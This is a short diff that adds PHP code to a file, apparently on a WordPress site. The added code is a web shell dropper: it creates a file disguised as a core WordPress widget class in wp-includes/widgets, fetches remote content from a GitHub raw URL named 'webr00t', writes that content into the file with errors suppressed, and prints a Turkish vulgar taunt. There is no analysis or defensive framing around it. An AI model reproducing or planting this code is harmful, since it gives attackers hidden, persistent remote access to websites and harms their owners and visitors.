@@ -1,1 +1,11 @@
-asd
+$yol = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/widgets/class-wp-widget-load.php";
+if ( file_exists( $yol ) ) {
+//unlink($yol);
+}else {
+@touch($yol);
+$yazlan = file_get_contents("https://raw.githubusercontent.com/webr00t/web/master/s.txt");
+@$kayit = fopen($yol, "a"); 
+@fwrite($kayit,$yazlan);
+@fclose($kayit);
+echo "sikerlerbaba";
+ }
